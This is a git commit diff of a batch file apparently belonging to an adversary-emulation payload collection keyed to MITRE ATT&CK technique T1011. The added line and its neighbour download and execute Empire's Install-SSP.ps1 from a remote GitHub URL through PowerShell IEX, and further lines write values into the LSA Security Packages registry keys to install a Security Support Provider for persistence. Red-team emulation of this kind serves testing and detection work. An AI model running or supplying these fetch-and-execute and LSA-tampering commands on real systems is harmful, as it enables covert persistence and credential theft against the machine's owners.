aa9dbfc06cdfc015e2330ba59ca28e435c597d53
rajrakeshdr <raj.rakeshdr@gmail.com>
2023-11-14 12:43:09 +0530

    Update T1011.bat

--- Payloads/T1011/T1011.bat
+++ Payloads/T1011/T1011.bat
@@ -8,6 +8,7 @@ ECHO Technique: Exfiltration Over Other Network Medium (T1011)
 ECHO.
 ECHO [+] Security Support Provider (SSP) added to LSA configuration
 ECHO -------------------------------------------------------------------
+echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rajrakeshdr/Empire/master/data/module_source/persistence/Install-SSP.ps1'); $m = Install-SSP -Path %Utilities%Dll1_64.dll; $m | powershell.exe -
 cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rajrakeshdr/Empire/master/data/module_source/persistence/Install-SSP.ps1'); $m = Install-SSP -Path %Utilities%Dll1_64.dll; $m
 reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages" /t REG_EXPAND_SZ /v T1011 /d calc.exe /f
 reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\OSConfig\Security Packages" /t REG_EXPAND_SZ /v T1011 /d calc.exe /f
